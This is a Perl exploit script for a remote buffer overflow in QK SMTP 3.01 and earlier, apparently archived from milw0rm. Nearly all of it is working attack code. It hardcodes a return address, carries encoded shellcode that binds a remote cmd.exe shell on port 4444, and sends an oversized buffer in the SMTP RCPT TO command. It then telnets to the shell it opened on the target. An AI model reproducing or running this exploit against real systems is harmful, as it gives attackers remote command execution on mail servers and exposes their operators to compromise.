<html><head><title>QK SMTP <= 3.01 (RCPT TO) Remote Buffer Overflow Exploit (pl)</title></head><pre>#!/bin/perl
#
#http://www.securityfocus.com/bid/20681
#
#	tested on winXp Pro SP0 English/winXp Pro SP2 Italian/win 2k SP4 Italian/English return address is universal
# bind a remote cmd.exe on target host on 4444 port; based on expanders original exploit
# credit to Greg Linares for discovered the vulnerability
# thanks to hdm and vlads902 for original shellcode;encoded using Skylined alpha2 tool
# Jacopo Cervini aka acaro [at] jervus.it


if (@ARGV &lt; 1) {
print &quot;--------------------------------------------------------------------\n&quot;;
print &quot;Usage : qksmtp-rcpt-overflow-4444.pl TargetIPAddress \n&quot;;
print &quot; Example : ./qksmtp-rcpt-overflow-4444.pl 127.0.0.1 \n&quot;;
print &quot;--------------------------------------------------------------------\n&quot;;
}



use IO::Socket::INET;

my $host = shift(@ARGV);
my $port = 25;
my $reply;
my $request;
#my $eip=&quot;\x43\x43\x43\x43&quot;;	

my $eip=&quot;\x8f\x29\x46\x00&quot;;	#call esp in QKSmtpServer3.exe



$sc=
&quot;PPYAIAIAIAIAIAIAIAIAIAIAIAIAIAIAjXAQADAZABARALAYAIAQAIAQAIAhAAAZ1AIAIAJ11AIAIABABABQI1AIQIAIQI111AIAJQYAZ&quot;.
&quot;BABABABABkMAGB9u4JBYlQZjKNmiXkIyokOkOOptKplmTo4RkQ5oL2kCLm5PxkQJORkPOLX4KOoKpIqjKOYtKP4DKkQZNp1upryVLqtWP&quot;.
&quot;44LGWQgZjmjaXBJKL4MkntktnHt5IURkqOnDkQzKqVRkLLNkRkQOMLM1xkm3NLTKQyBLO4mLoqy3lqIK34rkmsLptKQ0LL4KppmL4mdKM&quot;.
&quot;pKXOnaX4N0NLNjLNpKOz6ovOcRFOxlsOBphSGRSoBaOOdkOXPRH8KjMKLOKpPkO6vQOTIXeOve1JMm8JbnuqZKRkOHPbH7izizUvMPWYo&quot;.
&quot;6vnsOcQCb3PSMsNsOSNskOfp1VqXLQ1LrFnsu99QTUQXTdMJ2PewqGkOVvqZZpnqPUkOXPph3tTmNNZINwKO6vns0UKO6pOxIUoYBfa9r&quot;.
&quot;7Yo6vb00TOdR5YoHP3cRHgwRYGVbYnwkOJ6OeyoJ0s60j1T36OxqSrMU9jEozPPPYNIxLQyzGrJmtriYRnQGPZSdjkNORlmynMrnL63Bm&quot;.
&quot;PznXvKFKVKqXPrKNvSMFyoD5Mtyo6vqKPWPRPQoaNqbJkQpQpQoepQKOfpOxtmz9m58NNsiovv2JYoyoLw9oVpDK27ilqsvds4KOWfpRk&quot;.
&quot;OvpOxhp1zitOonsKOyFKO6pA&quot;;


$jmpback = &quot;\x50\x73&quot;.
&quot;\x54\x73&quot;.
&quot;\x58\x73&quot;.
&quot;\xb0&quot;.
&quot;\x48\x73&quot;.
&quot;\xb0\x48\x73&quot;.
&quot;\xb0\x48\x73&quot;.
&quot;\xb0\x48\x73&quot;.
&quot;\xb0\x48\x73&quot;.
&quot;\xb0\x48\x73&quot;.
&quot;\xb0\x48\x73&quot;.
&quot;\xb0\x48\x73&quot;.
&quot;\xb0\x48\x73&quot;.
&quot;\xb0\x48\x73&quot;.
&quot;\xb0\x48\x73&quot;.
&quot;\xb0\x48\x73&quot;.
&quot;\xb0\x48\x73&quot;.
&quot;\x40\x73&quot;.
&quot;\x40\x73&quot;.
&quot;\x40\x73&quot;.
&quot;\x40\x73&quot;.
&quot;\x40\x73&quot;.
&quot;\x40\x73&quot;.
&quot;\x40\x73&quot;.
&quot;\x50\x73&quot;.
&quot;\xc3\x73&quot;;

my $buffer =(&quot;\x41&quot;x296).$eip.(&quot;\x73&quot;x2228).$sc.(&quot;\x45&quot;x820).$jmpback.&quot;\x00&quot;;



my $socket = IO::Socket::INET-&gt;new(proto=&gt;'tcp', PeerAddr=&gt;$host, PeerPort=&gt;$port);
$socket or die &quot;Cannot connect to host!\n&quot;;

recv($socket, $reply, 1024, 0);
print &quot;Response:&quot; . $reply;


$request = &quot;helo acaro&quot; . &quot;\r\n&quot;;
send $socket, $request, 0;
print &quot;[+] Sent helo request\n&quot;;
recv($socket, $reply, 1024, 0);
print &quot;Response:&quot; . $reply;
sleep(1);

$request = &quot;mail from: acaro@peaceandlove.peace&quot; . &quot;\r\n&quot;;
send $socket, $request, 0;
print &quot;[+] Sent mail from request\n&quot;;
recv($socket, $reply, 1024, 0);
print &quot;Response:&quot; . $reply;
sleep(1);

$request = &quot;rcpt to: &quot; . $buffer . &quot;\r\n&quot;;
send $socket, $request, 0;
print &quot;[+] Sent rcpt to request\n&quot;;



print &quot; + connect on 4444 port of $host ...\n&quot;;
sleep(3);
system(&quot;telnet $host 4444&quot;);
exit;

# milw0rm.com [2007-01-01]</pre></html>